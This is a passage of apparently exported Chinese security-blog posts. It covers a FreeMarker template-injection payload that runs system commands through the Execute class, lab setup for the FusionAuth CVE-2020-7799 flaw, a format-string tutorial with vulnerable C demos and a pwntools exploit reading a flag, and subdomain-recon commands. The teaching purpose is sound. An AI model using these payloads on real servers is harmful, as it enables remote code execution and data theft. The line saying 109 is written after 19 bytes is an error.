<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;#list .data_model as key, object_test&gt;</span><br><span class="line"></span><br><span class="line">&lt;b&gt;Testing &quot;$&#123;key&#125;&quot;:&lt;/b&gt;&lt;br/&gt;</span><br><span class="line"></span><br><span class="line">&lt;#attempt&gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign classloader=object_test.class.protectionDomain.classLoader&gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign owc=classloader.loadClass(&quot;freemarker.template.ObjectWrapper&quot;)&gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign dwf=owc.getField(&quot;DEFAULT_WRAPPER&quot;).get(null)&gt;</span><br><span class="line"></span><br><span class="line">&lt;#assign ec=classloader.loadClass(&quot;freemarker.template.utility.Execute&quot;)&gt;</span><br><span class="line"></span><br><span class="line">Shell ! (</span><br><span class="line"></span><br><span class="line">$&#123;dwf.newInstance(ec,null)(&quot;id&quot;)&#125;</span><br><span class="line"></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">&lt;#recover&gt;</span><br><span class="line"></span><br><span class="line">failed</span><br><span class="line"></span><br><span class="line">&lt;/#attempt&gt;</span><br><span class="line"></span><br><span class="line">&lt;br/&gt;&lt;br/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/#list&gt;</span><br></pre></td></tr></table></figure>



<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://cloud.tencent.com/developer/article/1516336">模板注入漏洞全汇总 - 云+社区 - 腾讯云 (tencent.com)</a></p>
<p><a href="https://cloud.tencent.com/developer/article/1771497">详解模板注入漏洞（下） - 云+社区 - 腾讯云 (tencent.com)</a></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MzAxODcyNjEzNQ==&mid=2247518980&idx=4&sn=2fa791299de826677ad77e28c9e053ee&chksm=9bd3269caca4af8a9659666c8fc5a272f6f0de5927dbe305e25dacc104cc02b2154dfebf4ac9&scene=21#wechat_redirect">详解模板注入漏洞（上） (qq.com)</a></p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>模板注入</category>
        <category>注入漏洞集合</category>
      </categories>
      <tags>
        <tag>-Web漏洞 -模板注入集合</tag>
      </tags>
  </entry>
  <entry>
    <title>模板注入之Freemaker</title>
    <url>/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/</url>
    <content><![CDATA[<h1 id="模板注入之Freemaker"><a href="#模板注入之Freemaker" class="headerlink" title="模板注入之Freemaker"></a>模板注入之Freemaker</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>FreeMarker 是一款 模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p>
<p>模板编写为FreeMarker Template Language (FTL)。它是简单的，专用的语言， <em>不是</em> 像PHP那样成熟的编程语言。 那就意味着要准备数据在真实编程语言中来显示，比如数据库查询和业务运算， 之后模板显示已经准备好的数据。在模板中，你可以专注于如何展现数据， 而在模板之外可以专注于要展示什么数据。</p>
<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221142325248.png" class title="image-20220221142325248">

<p>这种方式被称为 MVC (模型 视图 控制器) 模式，对于动态网页来说，是一种特别流行的模式。 它帮助从开发人员(Java 程序员)中分离出网页设计师(HTML设计师)。设计师无需面对模板中的复杂逻辑， 在没有程序员来修改或重新编译代码时，也可以修改页面的样式。</p>
<p>而FreeMarker最初的设计，是被用来在MVC模式的Web开发框架中生成HTML页面的，它没有被绑定到 Servlet或HTML或任意Web相关的东西上。它也可以用于非Web应用环境中。</p>
<p>FreeMarker 是 免费的， 基于Apache许可证2.0版本发布。</p>
<h2 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h2><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>FusionAuth存在Freemaker模板注入，涉及版本FusionAuth &lt;&#x3D; 1.11.0。</p>
<p>FusionAuth是一个免费的身份管理平台，安装简单，易于集成。FusionAuth提供登录、注册、MFA、SSO、电子邮件模板、本地化、密码控制、强哈希、网络挂钩、基于角色的访问控制等功能。</p>
<p><strong>下载命令</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://storage.googleapis.com/inversoft_products_j098230498/products/fusionauth /1.10.0/fusionauth-app-1.10.0.zip</span><br></pre></td></tr></table></figure>

<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221143010639.png" class title="image-20220221143010639">



<p>下载elasticsearch插件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://storage.googleapis.com/inversoft_products_j098230498/products/fusionauth /1.10.0/fusionauth-search-1.10.0.zip</span><br></pre></td></tr></table></figure>

<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221161405215.png" class title="image-20220221161405215">



<p>进入bin目录，执行startup.sh脚本开始安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./startup.sh</span><br></pre></td></tr></table></figure>

<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221161600923.png" class title="image-20220221161600923">



<p>进入bin目录，执行startup.sh脚本开始安装</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./startup.sh</span><br></pre></td></tr></table></figure>

<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221151633154.png" class title="image-20220221151633154">



<p>然后浏览器访问9011端口，配置数据库和ElasticSearch连接</p>
<img src="/2022/02/21/%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B9%8BFreemaker/image-20220221151741345.png" class title="image-20220221151741345">









<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/xuandao_ahfengren/article/details/107742893">(60条消息) FusionAuthRCE(CVE-2020-7799)复现_锋刃科技的博客-CSDN博客_fusionauth</a></p>
<p>[(60条消息) <a href="https://blog.csdn.net/caiqiiqi/article/details/104186575">CVE-2020-7799] Apache FreeMarker模板FusionAuth远程代码执行_公众号shadow sock7-CSDN博客</a></p>
<p><a href="https://gitee.com/itdragon/springmvc">springmvc: 学习SpringMVC代码 (gitee.com)</a></p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>模板注入</category>
        <category>模板漏洞</category>
      </categories>
      <tags>
        <tag>-Web漏洞 -模板注入 -freemaker</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞</title>
    <url>/2024/01/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p>在编程语言中，常用的输出字符函数:printf()。第一个参数是字符串，被称为格式化字符串，程序员可以在该字符串中使用 %d、%s、%c 等占位符，printf 将依据这些占位符和其他参数整合出一个完整的字符串并输出。</p>
<img src="/2024/01/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20231125114713856.png" class title="image-20231125114713856">

<p><strong>格式控制字符类型</strong></p>
<img src="/2024/01/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20231125114756790.png" class title="image-20231125114756790">

<p><strong>常见的格式化字符串函数</strong></p>
<p>输入：Scanf</p>
<p>输出：</p>
<img src="/2024/01/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20231125114943558.png" class title="image-20231125114943558">

<p>printf是我们使用的最多的一个函数，将格式化之后的字符串输出到标准输出流中。所有 printf 函数族的返回值是：写入字符串成功返回写入的字符总数，写入失败则返回一个负数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sprintf(char * _s,const char* _format,...)</span><br></pre></td></tr></table></figure>



<h2 id="漏洞基本原理"><a href="#漏洞基本原理" class="headerlink" title="漏洞基本原理"></a>漏洞基本原理</h2><p>我们先来看一个简单的c语言程序，如图输出a的值为10</p>
<img src="/2024/01/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20231125115654500.png" class title="image-20231125115654500">

<p>下面我们修改下代码，继续观察printf()打印的字符串为459461944</p>
<img src="/2024/01/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20231125115801258.png" class title="image-20231125115801258">

<p><strong>哎？为什么两个程序输出不一样呢？</strong></p>
<p>两个程序代码不同的是sprintf()函数的参数不同：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">printf(&quot;The value of a is %d\n&quot;,a);</span><br><span class="line">printf(&quot;The value of a is %d\n&quot;);</span><br></pre></td></tr></table></figure>

<p>第一个printf()输出的是a的值，但第二个printf()没有指定参数，为什么会输出459461944呢，这就要回到printf()这个函数上来</p>
<p><strong>格式化字符串漏洞原理：</strong></p>
<p>printf不会检查格式化字符串中的占位符算法与所给的参数数目相等，这是什么意思呢？我们使用函数堆栈来解释</p>
<p>当第一个sprintf中，格式化字符遇到%d时会去依次调用参数，这里就是去调用参数a&#x3D;10并输出</p>
<img src="/2024/01/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20231125122223145.png" class title="image-20231125122223145">

<p>在第二个sprintf中，由于在格式化字符后没有给出参数，但printf仍然回去调用格式化字符后的其他栈帧数据并输出</p>
<img src="/2024/01/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20231125122616421.png" class title="image-20231125122616421">

<p><strong>综合可以看出，如果用户通过可控数据向printf()传递非法数据，使得格式化字符所要求的参数个数与实际参数数量不匹配，将导致栈溢出漏洞，可用于任意内存读写，堆栈破环，返回地址被修改等</strong></p>
<h2 id="Demo分析"><a href="#Demo分析" class="headerlink" title="Demo分析"></a>Demo分析</h2><p>代码如下所示</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//gcc test.c -o test -m64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> a[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,a);</span><br><span class="line">    <span class="built_in">printf</span>(a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输入<strong>AAAA-%x-%x-%x-%x-%x-%x</strong>，查看运行结果</p>
<img src="/2024/01/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20231125123211762.png" class title="image-20231125123211762">

<p>由于这里printf(a)，将a当作是format格式化字符，其中每遇到一个占位符%x就会去调用函数栈帧中紧挨这fromat格式化字符的一个内存数据，所以这里输入有6个占位符，输出就有6个内存数据，其中“414141”这个数据就是“AAAA”字符串的ASCII码的十六进制，所以可以得到此时a数组在函数栈中的偏移量为6</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="拒绝服务攻击"><a href="#拒绝服务攻击" class="headerlink" title="拒绝服务攻击"></a>拒绝服务攻击</h3><p>攻击者使用多个%s作为格式化字符串函数来使程序崩溃，原因是当访问的地址处于保护或者是非法地址时，程序会报错。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    char test[128];</span><br><span class="line">    while (1)</span><br><span class="line">    &#123;</span><br><span class="line">        scanf(&quot;%s&quot;, test);</span><br><span class="line">        printf(test);   </span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当输入正确的字符时运行正常，但%s占位符输入过多时就会导致程序崩溃</p>
<img src="/2024/01/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20231125124923768.png" class title="image-20231125124923768">

<h3 id="内存数据读取"><a href="#内存数据读取" class="headerlink" title="内存数据读取"></a>内存数据读取</h3><p>利用格式化字符漏洞读取堆栈内存中的数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//关闭canary保护，开启栈可执行编译</span><br><span class="line">//gcc -fno-stack-protector -z execstack test.c -o test</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;%s %d %s %08x %08x %08x&quot;,&quot;Hello World!&quot;,233,&quot;\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以读取到其他内存数据</p>
<img src="/2024/01/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20231125130728304.png" class title="image-20231125130728304">

<p><strong>获取栈变量数值</strong></p>
<p>通过%n$x获取指定位置的参数，如下图所示</p>
<img src="/2024/01/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20231125130915358.png" class title="image-20231125130915358">

<p>此时在栈中aaaa的偏移量为6，这里输入%6$x指定第六个参数即616161</p>
<ul>
<li>用%nx获取%p按顺序泄露栈数据</li>
<li>用%s获取变量地址，遇0截断</li>
<li>用%ns或者%n$s获取指定指定n个参数的值或字符串</li>
</ul>
<h3 id="任意地址读取"><a href="#任意地址读取" class="headerlink" title="任意地址读取"></a>任意地址读取</h3><p>原理就是利用%s去读取输入的十六进制内存地址，但遇0则截断</p>
<p>demo如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">char *flag=&quot;flag&#123;Pwn_Caiji_Xiao_fen_dui&#125;\n&quot;;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">  char s[100];</span><br><span class="line">  int a = 1, b = 0x22222222, c = -1;</span><br><span class="line">  printf(&quot;Please input s\n&quot;)</span><br><span class="line">  scanf(&quot;%s&quot;, s);</span><br><span class="line">  printf(&quot;%08x.%08x.%08x.%s\n&quot;, a, b, c, s);</span><br><span class="line">  printf(s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>首先确定受控参数的偏移量</li>
</ul>
<img src="/2024/01/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20231125133422347.png" class title="image-20231125133422347">

<p>这里s在第二个printf函数中的偏移量为6</p>
<ul>
<li>将受控参数替换为要读取内存的地址</li>
</ul>
<p>这里需要读取flag字符，查询该字符的偏移量</p>
<img src="/2024/01/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20231125133905103.png" class title="image-20231125133905103">

<p>或者使用pwnlib.elf模块来获取符号名偏移量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">elf = ELF(&quot;./test1&quot;)</span><br><span class="line">#获取flag符号偏移</span><br><span class="line">flag_offset = elf.symbols[&#x27;flag&#x27;]</span><br></pre></td></tr></table></figure>

<ul>
<li>构造输入参数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = p32(flag_offset)+b&#x27;%6$s&#x27;</span><br></pre></td></tr></table></figure>

<p>exp代码如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#导入pwn模块</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#设置运行环境</span></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;splitw&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"><span class="comment">#封装进程</span></span><br><span class="line">p = process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line"><span class="comment">#解析ELF</span></span><br><span class="line">leakmemory = ELF(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line"><span class="comment">#获取flag符号偏移</span></span><br><span class="line">flag_offset = leakmemory.symbols[<span class="string">&#x27;flag&#x27;</span>] <span class="comment">#如果要泄漏got表可以改成 leakmemory.got[&#x27;printf&#x27;]等函数名.</span></span><br><span class="line"><span class="comment">#构造Payload</span></span><br><span class="line">Payload = p32(flag_offset) + <span class="string">b&#x27;%6$s&#x27;</span></span><br><span class="line"><span class="comment">#发送Payload</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 发送Payload:&quot;</span>)</span><br><span class="line">p.sendline(Payload)</span><br><span class="line"><span class="built_in">print</span>(Payload)</span><br><span class="line"><span class="comment">#接受返回数据</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] 接受数据:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">flag = p.recv()</span><br><span class="line">flag = u32(flag[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag地址:&#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(flag)))</span><br><span class="line"><span class="comment">#打印flag</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] flag如下:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="comment">#读取leakmemory中flag内存</span></span><br><span class="line"><span class="built_in">print</span>(leakmemory.read(flag,<span class="number">30</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="内存数据覆盖"><a href="#内存数据覆盖" class="headerlink" title="内存数据覆盖"></a>内存数据覆盖</h3><p>使用%n将占位符之前输出的字节数写入到目标地址中</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a = <span class="number">10</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The value of a is %d\n&quot;</span>,a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;0123456789876543210%n\n&quot;</span>,&amp;a);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;THe value of a is %d&quot;</span>,a);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行结果如下</p>
<img src="/2024/01/17/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/image-20231125140922583.png" class title="image-20231125140922583">

<p>可以看到，a 的值被修改为了 19。这是因为 <code>printf(&quot;0123456789876543210%n\n&quot;, &amp;a)</code> 中 <code>%n</code> 前已经成功输出了 “0123456789876543210” 共计 19 个字节，因此 <code>%n</code> 便会将 109写入目标地址a中。**%n 会将其对应的参数作为地址解析。因此只要我们向栈上写入目标地址，再使用 %n 即可向目标地址写入数据。**</p>
]]></content>
      <categories>
        <category>逆向分析</category>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>-CTF -Web</tag>
      </tags>
  </entry>
  <entry>
    <title>渗透测试之信息收集(一)</title>
    <url>/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/</url>
    <content><![CDATA[<h1 id="渗透测试之信息收集-一"><a href="#渗透测试之信息收集-一" class="headerlink" title="渗透测试之信息收集(一)"></a>渗透测试之信息收集(一)</h1><h2 id="域名收集"><a href="#域名收集" class="headerlink" title="域名收集"></a>域名收集</h2><p>域名：（英语：<strong>Domain<br>Name</strong>),又称<strong>网域</strong>.是由一串用点分隔的名字组成的<a href="https://baike.baidu.com/item/Internet">Internet</a>上某一台计算机或计算机组的 名称 ，用于在数据传输时对计算机的定位标识（有时也指地理位置）。访问域名时通过DNS域名服务器进行与IP转换。</p>
<h3 id="Whois查询"><a href="#Whois查询" class="headerlink" title="Whois查询"></a>Whois查询</h3><p>Whois：是用来查询<a href="https://baike.baidu.com/item/%E5%9F%9F%E5%90%8D/86062">域名</a>的IP以及所有者等信息的<a href="https://baike.baidu.com/item/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE/8048821">传输协议</a>。简单说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。whois通常使用TCP协议43端口。每个域名&#x2F;IP的whois信息由对应的管理机构保存。</p>
<p>Whois查询方法（两种）</p>
<ol>
<li><p>使用web接口查询</p>
<p>比如<a href="https://whois.aliyun.com/,http://whois.baidu.com/%E7%AD%89%E3%80%82%E8%BF%99%E9%87%8C%E4%BD%BF%E7%94%A8%E7%AB%99%E9%95%BF%E4%B9%8B%E5%AE%B6%E8%BF%9B%E8%A1%8Cwhois%E6%9F%A5%E8%AF%A2%E3%80%82">https://whois.aliyun.com/,http://whois.baidu.com/等。这里使用站长之家进行whois查询。</a></p>
<p>下面查看baidu.com域名信息显示被屏蔽，可能百度讲whois屏蔽无法访问</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/08a4eef7535f30bac9ecc5cb37d37778.png" class>



<p>如下查询aliyun.com域名信息，查询结果如下图所示</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/470994d66d9bf282dad079c0627de713.png" class>



<p>可以看到目标域名注册人的信息</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/a6dc9806f2324cf7d742e28880129fae.png" class>


</li>
<li><p>在kali linux上运行whois查询工具通过命令行来进行Whois域名进行查询.</p>
<p>这里使用whois查询baidu.com的域名信息，如下图所示</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/733284b552def66b38cc2110c50f5771.png" class></li>
</ol>
<h3 id="ICP查询"><a href="#ICP查询" class="headerlink" title="ICP查询"></a>ICP查询</h3><blockquote>
<p>  网络内容服务商英文为 Internet Content Provider<br>  简写为ICP，即向广大用户综合提供互联网信息业务和增值业务的电信运营商。其必须具备的证书即为ICP证。ICP证是指各地通信管理部门核发的《中华人民共和国电信与信息服务业务经营许可证》.icp备案对网站进行备案</p>
</blockquote>
<blockquote>
<p>  ICP查询方法（使用web接口查询）</p>
</blockquote>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/56eb1190e2de1a4fcb2f87797708863b.png" class>

<blockquote>
<p>  如下使用ICP备案查询网对baidu.com域名网站进行icp备案查询，显示许可证号，主办单位名称，网站名称和其网站所有子域名信息等</p>
</blockquote>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/7062e5befdff51e975be680cbe403fd9.png" class>



<h2 id="子域名信息收集"><a href="#子域名信息收集" class="headerlink" title="**子域名信息收集  **"></a>**子域名信息收集  **</h2><blockquote>
<p>  子域名：在顶级域名前加后缀的都是该顶级域名的子域名</p>
</blockquote>
<blockquote>
<p>  我国顶级域名为.cn，顶级域名的二级域名中类别域名有6个，.ac为科研机构，.com用于工商金融企业，.edu用于教育机构,.gov用于政府部门,.net用于互联网信息中心和运行中心，.org用于非营利组织</p>
</blockquote>
<blockquote>
<p>  当主域名防御措施完善时，我们可以通过拿下其子域名来对一步一步进行渗透</p>
</blockquote>
<h3 id="子域名挖掘工具"><a href="#子域名挖掘工具" class="headerlink" title="子域名挖掘工具"></a>子域名挖掘工具</h3><p>MaltegoCE，wydomin，subDomainsBrute，dnsmaper,layer子域名挖掘机。（具体查看工具使用方法）</p>
<p>这里使用wydomin对baidu.com域名进行子域名挖掘，使用命令:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./dnsburte.py -d baidu.com -f dnspod.csv -obaidu.txt</span><br></pre></td></tr></table></figure>



<p>使用字典对改域名进行爆破，及那个满足的域名保存在baidu.txt文件中</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/010b73ad82bcae8a0fe154efb90ce979.png" class>



<p>查看该文件，观察baidu.com下的子域名，其中包含了其子域名</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/668935855150b41fe29c91cc6d8a9eef.png" class>



<p>也可以使用APL进行匹配查询，使用</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./wydomain.py -d baidu.com -o baidu.log</span><br></pre></td></tr></table></figure>



<p>命令对baidu.com域名进行进一步查询，更加有效的收集子域名信息</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/6ca6f87c66b18171baa3b44b27054e33.png" class>



<p>查看收集到的子域名信息保存在baidu1.log，如下图就显示出很多子域名，更加有效</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/287f2f69cc2594a82b281c92cf15c73c.png" class>



<h3 id="搜索引擎挖掘"><a href="#搜索引擎挖掘" class="headerlink" title="搜索引擎挖掘"></a>搜索引擎挖掘</h3><p>如在Google中输入site:sina.com挖掘sina.com的子域名，对搜索出来的网址点击查找，但比较花费时间，子域名如下：</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/8057d03a65c6544f9029b04ff2c6092f.png" class>



<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/e73c286f9080e271d2465ad67faae787.png" class>



<h3 id="第三方查询网站"><a href="#第三方查询网站" class="headerlink" title="第三方查询网站"></a>第三方查询网站</h3><p>&lt;<a href="http://tool.chinaz.com/subdomain">http://tool.chinaz.com/subdomain</a> <a href="https://dnsdumpster.com/&gt;">https://dnsdumpster.com/&gt;</a></p>
<p>使用查询子域名工具查询子域名比较快捷方便，这里查询sina.com的相关子域名</p>
<img src="/2020/11/11/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86(%E4%B8%80)/5316f52ac092355b709115cb34dbeaf9.png" class>



<h3 id="证书透明公开日志枚举"><a href="#证书透明公开日志枚举" class="headerlink" title="证书透明公开日志枚举"></a>证书透明公开日志枚举</h3><p> &lt;<a href="http://crt.sh/">http://crt.sh/</a> <a href="http://censys.io/&gt;">http://censys.io/&gt;</a></p>
